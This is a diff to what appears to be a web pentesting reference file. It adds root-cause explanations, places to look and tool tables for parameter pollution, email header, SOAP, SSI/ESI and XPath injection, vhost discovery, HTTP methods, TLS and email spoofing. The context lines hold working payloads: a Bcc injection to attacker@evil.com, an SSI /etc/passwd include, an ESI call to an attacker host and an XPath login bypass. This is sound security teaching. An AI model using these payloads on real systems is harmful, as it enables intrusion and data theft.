@@ -39,6 +39,20 @@ var VULNS = [
           { "label": "Array form", "cmd": "user[]=self&user[]=admin   (does the last/first/array win?)" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "HTTP does not define which occurrence wins when a parameter repeats (a=1&a=2), so each component — web server, framework, WAF — resolves it independently.",
+            "The exploit is the DISAGREEMENT: if a WAF/filter inspects one occurrence while the application uses another, malicious input reaches the app un-inspected; if the app counts a value twice, a limit is doubled.",
+            "Query-string, POST body, and array/bracket notation are all affected, and server-side request builders can carry the pollution into a downstream call.",
+            "It is both a standalone flaw (business-logic abuse, server-value override) and a bypass technique amplifying SQLi, XSS, and access-control.",
+            "The fix is consistency and rejection: resolve duplicates to one canonical value everywhere, or reject unexpected duplicates outright."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Any parameter you can send twice: query string, POST body, JSON-vs-form endpoints, and array/bracket forms (a[]=).",
+            "Endpoints behind a WAF/input filter — the app and the filter may resolve duplicates differently (injection smuggling).",
+            "Single-use / limited actions (coupons, votes, one-per-account) where a duplicated parameter might apply twice.",
+            "Server-side values the client shouldn't set (role, price, userId) that might be overridden by a second occurrence.",
+            "Features that build a downstream URL/API request from input (redirects, share links, integrations)."
+          ]},
           { "title": "How It's Tested", "type": "commands", "commands": [
             { "label": "1. Establish which occurrence wins", "cmd": "# send a benign duplicate and observe the reflected/processed value\ncurl -s 'https://target/echo?x=first&x=second'\n# note whether the app uses first, last, both, or an array" },
             { "label": "2. Use it to bypass a filter / WAF", "cmd": "# WAF may inspect only the first value while the app concatenates:\n/item?id=1&id=2)+UNION+SELECT+...\n# or split a blocked keyword across copies the backend rejoins" },
@@ -57,6 +71,11 @@ var VULNS = [
             ["Duplicate discount / vote", "Business-logic abuse - double redemption"],
             ["Override server field", "Set a value (role, price) the client shouldn't control"],
             ["Downstream request tampering", "Redirect, SSRF, or API-parameter manipulation"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite (Repeater)", "Duplicate parameters and observe which value the app processes"],
+            ["Burp Param Miner", "Discover accepted/hidden parameters to pollute"],
+            ["curl", "Quick duplicate-parameter probing"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP - HTTP Parameter Pollution", "url": "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution" },
@@ -84,6 +103,20 @@ var VULNS = [
           { "label": "Spoof the subject / body", "cmd": "subject=Hi%0d%0aX-Injected:1%0d%0a%0d%0aInjected body" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "Email headers are CRLF-delimited (like HTTP); when user input used to build a header is not stripped of newlines, the attacker injects extra headers or a new body.",
+            "It is a specialisation of CRLF injection whose sink is a mail message rather than an HTTP response.",
+            "The highest-value injection is a hidden Bcc/Cc on a message that carries a secret (a password-reset link), silently delivering the token to the attacker.",
+            "Address fields are also abusable: extra recipients, spoofed From/Reply-To for phishing, or turning the form into a spam relay from the app's trusted domain.",
+            "Root fix: never concatenate raw input into header lines — use a mail API that separates headers from body and rejects embedded newlines."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Any feature that sends mail: contact/feedback forms, invitations, 'share by email', password reset, notifications.",
+            "Fields that flow into headers: sender name, From/Reply-To, To/Cc, and Subject.",
+            "Password-reset flows specifically — a Bcc injection here yields the reset token.",
+            "APIs that accept a recipient or subject from the client.",
+            "Confirm by injecting a Bcc to a mailbox you control and checking for a copy."
+          ]},
           { "title": "How It's Exploited", "type": "commands", "commands": [
             { "label": "1. Find a mail-sending feature that reflects input", "cmd": "# contact form, invite, share-by-email, password reset\n# any field (name, subject, from, to) that ends up in the message headers is a sink" },
             { "label": "2. Inject CRLF + a header", "cmd": "# URL-encoded newlines: %0d%0a (CR LF)\nname=Attacker%0d%0aBcc:attacker@evil.com\n# if a copy of the mail reaches attacker@evil.com, injection is confirmed" },
@@ -94,6 +127,11 @@ var VULNS = [
             ["To", "Redirect or add recipients"],
             ["From / Reply-To", "Spoof the sender for phishing"],
             ["Subject / body", "Inject arbitrary content, relay spam"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Inject CRLF + headers into mail-building fields"],
+            ["A mailbox / catch-all you control", "Confirm a Bcc/Cc injection by receiving a copy"],
+            ["curl", "Post crafted values directly to the mail endpoint"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP - SMTP Injection", "url": "https://owasp.org/www-community/vulnerabilities/SMTP_Injection" },
@@ -121,6 +159,20 @@ var VULNS = [
           { "label": "Combine with XXE", "cmd": "switch to XML sinks and try external entities too" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "SOAP requests are XML envelopes; when the server (or an intermediary) builds that XML by concatenating user input without XML-encoding it, injected metacharacters and tags change the document's structure.",
+            "It is the XML analogue of SQLi: the attacker closes an intended element and adds their own, so the backend parses fields it never expected (a <role>, an extra <amount>).",
+            "Effects depend on how the service uses the parsed values — auth bypass, price/role/quantity tampering, data disclosure, or a parser-crash DoS.",
+            "SOAP/XML sinks are also XXE sinks: if the parser resolves entities, test for XXE on the same endpoint (see XXE).",
+            "Fix by constructing XML with a proper API that encodes values and validating against a strict schema."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "SOAP/XML web services (Content-Type text/xml or application/soap+xml) and WSDL-described endpoints.",
+            "Legacy enterprise APIs, payment/partner integrations, and internal services that speak SOAP.",
+            "Fields whose values are placed into the envelope — username, id, amount, role.",
+            "Endpoints that accept XML where the app appears to build the message from parameters.",
+            "The same endpoints for chained XXE (DOCTYPE/entity processing)."
+          ]},
           { "title": "How It's Exploited", "type": "commands", "commands": [
             { "label": "1. Probe with XML metacharacters", "cmd": "# submit <, >, & and closing tags in each field and watch for errors or changed behaviour\n<username>test</username>  ->  <username>test</username><injected>1</injected>" },
             { "label": "2. Inject a trusted element", "cmd": "# if the envelope is built by string concatenation, close the value and add your own:\nusername = bob</username><role>administrator</role><username>\n# result: the server may parse an extra <role> it did not expect" },
@@ -132,6 +184,11 @@ var VULNS = [
             ["Data disclosure", "Coax the service into returning extra data"],
             ["Denial of service", "Malformed or expanding XML crashes the parser"],
             ["Chained XXE", "External entities on the same XML sink"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Tamper SOAP envelopes and inject XML metacharacters/elements"],
+            ["SoapUI", "Craft and replay SOAP requests against the service"],
+            ["Burp WSDLer / wsdl parsing", "Enumerate SOAP operations and parameters"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP WSTG - Input Validation Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" },
@@ -159,6 +216,20 @@ var VULNS = [
           { "label": "ESI variant", "cmd": "<esi:include src=\"http://attacker/\" />   (Edge Side Includes)" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "The web server parses certain pages (classically .shtml) for SSI directives and evaluates them while rendering; if user input is reflected/stored into such a page unencoded, injected directives are executed by the server.",
+            "Detection is a directive that produces observable output (<!--#echo var=\"DATE_LOCAL\" -->); execution depends on which directives the server permits.",
+            "<!--#exec --> gives command execution where enabled; IncludesNOEXEC disables exec but still allows <!--#include -->/file read.",
+            "Edge Side Includes (ESI) is a related class on caching proxies/CDNs — <esi:include> can yield SSRF or, with some engines, RCE.",
+            "Fix: don't reflect input into SSI-parsed pages, HTML-encode directive characters, and disable SSI/exec where not needed."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Pages served with .shtml/.shtm/.stm extensions, or paths a server is configured to parse for SSI.",
+            "Reflected or stored input rendered into such pages (comments, profile fields, filenames, error pages).",
+            "Apache/nginx/IIS configs enabling Includes; legacy sites are the usual candidates.",
+            "Caching proxies/CDNs that process ESI tags (test <esi:include>).",
+            "Confirm safely with an #echo of a server variable before trying include/exec."
+          ]},
           { "title": "How It's Exploited", "type": "commands", "commands": [
             { "label": "1. Confirm SSI is processed", "cmd": "# inject a harmless directive into a reflected/stored field:\n<!--#echo var=\"DATE_LOCAL\" -->\n# if the current date appears in the response, SSI is being evaluated" },
             { "label": "2. Read files / leak info", "cmd": "<!--#include virtual=\"/etc/passwd\" -->\n<!--#printenv -->" },
@@ -170,6 +241,11 @@ var VULNS = [
             ["<!--#exec cmd=... -->", "Run an OS command (if enabled) - RCE"],
             ["<!--#printenv -->", "Dump all environment variables"],
             ["<esi:include ...>", "Edge Side Includes - SSRF/RCE on caching proxies"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Inject SSI/ESI directives into reflected and stored fields"],
+            ["interactsh / Collaborator", "Confirm blind exec/ESI via an out-of-band callback"],
+            ["Nuclei (ssi/esi templates)", "Automated detection of SSI/ESI injection"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP - SSI Injection", "url": "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection" },
@@ -197,6 +273,20 @@ var VULNS = [
           { "label": "Blind XPath", "cmd": "boolean substring() tests to extract data character by character" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "The app builds an XPath expression by concatenating user input, so injected XPath syntax (quotes, or/and, position predicates) changes which nodes the query selects — the direct analogue of SQLi for XML data stores.",
+            "XPath has no access-control model: once you can influence the query, any node in the document is reachable, so extraction usually means the WHOLE document (often all users and credentials).",
+            "Where XPath drives login (//user[name='X' and pass='Y']), an always-true injection is a straight authentication bypass.",
+            "Blind extraction uses boolean/substring() oracles, walking values character by character when no data is reflected.",
+            "Fix with parameterised/precompiled XPath and variable binding, plus strict input validation."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Apps that store data or config in XML and query it with XPath (legacy and enterprise apps especially).",
+            "Login forms backed by an XML user store.",
+            "Search/filter/lookup features over XML data.",
+            "Fields placed into a query — username, id, search term.",
+            "Errors mentioning XPath/XML, or behaviour that changes when you submit ' \" [ ] ( )."
+          ]},
           { "title": "How It's Exploited", "type": "commands", "commands": [
             { "label": "1. Detect with metacharacters", "cmd": "# submit ' \" [ ] ( ) and watch for XPath/XML errors or changed results\nusername = test'" },
             { "label": "2. Authentication bypass", "cmd": "# the backend builds:  //user[name/text()='INPUT' and pass/text()='INPUT']\n# inject an always-true condition:\nname:  ' or '1'='1\npass:  ' or '1'='1\n# -> the filter matches the first user and logs you in" },
@@ -208,6 +298,11 @@ var VULNS = [
             ["Classic payload", "' or '1'='1  (identical shape to SQLi)"],
             ["Blind technique", "substring() + boolean oracles"],
             ["Impact", "Auth bypass and full document disclosure"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Inject XPath metacharacters and automate boolean/substring extraction"],
+            ["xcat", "Automated blind XPath-injection data extraction"],
+            ["curl", "Quick manual probing of login/search parameters"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP - XPath Injection", "url": "https://owasp.org/www-community/attacks/XPATH_Injection" },
@@ -6046,6 +6141,20 @@ var VULNS = [
           { "label": "Probe the default vhost", "cmd": "curl -s -H 'Host: nonexistent.invalid' https://<target-ip>/  (what does the catch-all serve?)" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "One IP serves many sites; the web server picks which to return from the Host header. Loose configuration lets an attacker set Host by hand and reach virtual hosts that were never meant to be public.",
+            "These hidden hosts (staging, admin, internal tools) have no public DNS record, so they are invisible to normal subdomain enumeration yet fully reachable once named.",
+            "A permissive default/catch-all vhost leaks server details, and weak tenant isolation on shared hosting lets a neighbour become a pivot.",
+            "It chains with Host Header Injection (the same attacker-controlled header) and often exposes weaker, unpatched code on staging.",
+            "Fix by isolating non-production/admin by network (not just an unadvertised name) and configuring a neutral default vhost."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Any server whose IP hosts multiple sites (shared hosting, a reverse proxy fronting several apps).",
+            "Guessable internal vhost names: staging., dev., admin., internal., uat., test..",
+            "The catch-all/default response for an unknown Host (does it leak a real site or server banner?).",
+            "Shared-hosting neighbours reachable via Host on the same IP.",
+            "Correlate with DNS/CT-log findings and with Host Header Injection testing."
+          ]},
           { "title": "How It's Tested", "type": "commands", "commands": [
             { "label": "1. Baseline the IP directly", "cmd": "# what does the server return for its IP with a bogus Host?\ncurl -s -H 'Host: doesnotexist.example' https://<target-ip>/ -k -o /dev/null -w '%{size_download}\\n'" },
             { "label": "2. Brute-force candidate vhosts", "cmd": "ffuf -w subdomains.txt -u https://<target-ip>/ -H 'Host: FUZZ.target.com' -k -fs <baseline>\n# filter out the baseline size to reveal distinct hosts" },
@@ -6057,6 +6166,12 @@ var VULNS = [
             ["Admin / internal tools", "High-privilege functionality not meant to be public"],
             ["Default / catch-all vhost", "Server version, sample pages, and config disclosure"],
             ["Co-tenant sites", "Weak isolation lets a neighbour become a pivot"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["ffuf", "Brute-force the Host header against the target IP, filtering the baseline"],
+            ["VHostScan", "Purpose-built vhost brute-forcer with catch-all detection"],
+            ["gobuster (vhost mode)", "Alternative virtual-host enumeration"],
+            ["Burp Suite", "Manually set Host and compare responses"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP WSTG - Configuration and Deployment Management Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" },
@@ -6198,6 +6313,20 @@ var VULNS = [
           { "label": "Test TRACE (XST)", "cmd": "curl -i -X TRACE https://target/  (echoes the request - XST if reflected)" }
         ],
         "sections": [
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "HTTP defines many methods beyond GET/POST; a web server or framework may enable some (PUT, DELETE, TRACE, CONNECT, PATCH) that the application never needs, usually as a configuration default.",
+            "The risk is that these methods perform powerful actions without the authorisation the app enforces on its normal routes — a writable PUT drops files, DELETE removes them.",
+            "TRACE echoes the request back; combined with a way to force a request it enables Cross-Site Tracing (XST) to read headers/cookies otherwise hidden.",
+            "CONNECT can turn the server into an open proxy; WebDAV methods extend the file-operation surface.",
+            "It is a hardening/config issue: the fix is to disable every method the app does not require and to authorise state-changing ones."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "OPTIONS response Allow/Public headers on the root and on individual paths (config is often per-directory).",
+            "Upload/static directories where PUT might write an executable file.",
+            "REST APIs that legitimately use PUT/DELETE/PATCH — check whether they enforce auth on those verbs.",
+            "Older servers/WebDAV endpoints, and every virtual host separately (method config varies per vhost).",
+            "TRACE/CONNECT availability at the edge and origin."
+          ]},
           { "title": "How It's Tested", "type": "commands", "commands": [
             { "label": "1. Enumerate the allowed methods", "cmd": "curl -s -i -X OPTIONS https://target/ | grep -i '^allow'\nnmap --script http-methods -p 80,443 target" },
             { "label": "2. Try to upload with PUT", "cmd": "curl -i -X PUT https://target/poc.html -H 'Content-Type: text/html' -d '<h1>poc</h1>'\ncurl -s https://target/poc.html   # served back? potential RCE with an executable extension" },
@@ -6209,6 +6338,12 @@ var VULNS = [
             ["TRACE", "Cross-Site Tracing (XST) - read otherwise-hidden headers/cookies"],
             ["CONNECT", "Use the server as an open proxy"],
             ["OPTIONS", "Not dangerous itself, but discloses the method list"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["curl", "Send OPTIONS and test PUT/DELETE/TRACE directly"],
+            ["Nmap (http-methods)", "Enumerate and flag risky methods"],
+            ["Nuclei", "Template-based detection of dangerous methods/WebDAV"],
+            ["davtest / cadaver", "Probe and exploit WebDAV PUT upload"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP WSTG - Test HTTP Methods", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" },
@@ -6995,6 +7130,28 @@ var VULNS = [
         ],
         sections: [
           {
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "TLS confidentiality/integrity holds only if both endpoints negotiate strong parameters; supporting obsolete protocols or weak ciphers lets an on-path attacker force a downgrade to something breakable.",
+              "Weak building blocks each have a consequence: obsolete protocols (SSLv3/TLS1.0/1.1) enable POODLE/BEAST-style attacks; RC4/3DES/EXPORT/NULL ciphers are cryptographically weak; small RSA keys and SHA-1 signatures are forgeable; missing forward secrecy means one key compromise decrypts past traffic.",
+              "Certificate problems (expired, self-signed on prod, hostname mismatch, untrusted CA) break the authentication half of TLS and enable man-in-the-middle.",
+              "Missing HSTS is what makes downgrade practical (SSL-strip) — the first plaintext request can be hijacked (see Missing Security Headers).",
+              "It is a configuration issue: the fix is a modern minimal protocol/cipher set plus sound certificate management, verified by re-scanning."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Every TLS endpoint, not just the web root: APIs, mail (SMTP/IMAP STARTTLS), admin panels, and internal services.",
+              "The negotiated protocol list and cipher suites (testssl/sslscan output).",
+              "Certificate validity, issuer, key size, signature algorithm, and hostname match.",
+              "Presence and strength of HSTS (max-age, includeSubDomains, preload).",
+              "Known-vulnerability flags (Heartbleed, POODLE, ROBOT) that scanners report."
+            ]
+          },
+          {
             title: "How It's Exploited",
             type: "commands",
             commands: [
@@ -7074,6 +7231,28 @@ var VULNS = [
           { label: "Assess", cmd: "Online DMARC/SPF checkers; MXToolbox; or manual dig" }
         ],
         sections: [
+          {
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "SMTP has no built-in sender authentication, so three DNS-published mechanisms bolt it on: SPF (which IPs may send for the domain), DKIM (a cryptographic signature over the message), and DMARC (a policy tying SPF/DKIM to the visible From: and telling receivers what to do on failure).",
+              "The domain is spoofable when any link is weak: no SPF or a soft/pass SPF (~all/+all), no DKIM, or — most commonly — DMARC set to p=none (monitor only) so failing mail is still delivered.",
+              "DMARC enforcement (p=quarantine/reject) with alignment is what actually blocks a forged From:; p=none provides reports but no protection.",
+              "Subdomain policy (sp=) is a frequent gap — the org's main domain may be protected while subdomains are freely spoofable.",
+              "All records are public in DNS, so the weakness is assessed entirely from outside with no access to the target."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "The domain's SPF TXT record (v=spf1 ...) — does it end in -all, ~all, or +all, or is it absent?",
+              "The _dmarc.<domain> TXT record — p=none vs quarantine/reject, and whether sp= and pct= weaken it.",
+              "DKIM selectors (selector._domainkey.<domain>) — is mail actually signed?",
+              "Subdomains and parked/secondary domains, which are often forgotten.",
+              "Whether the org relies on the domain for internal trust (invoices, HR, exec comms) — that raises impact."
+            ]
+          },
           {
             title: "How It's Exploited",
             type: "commands",
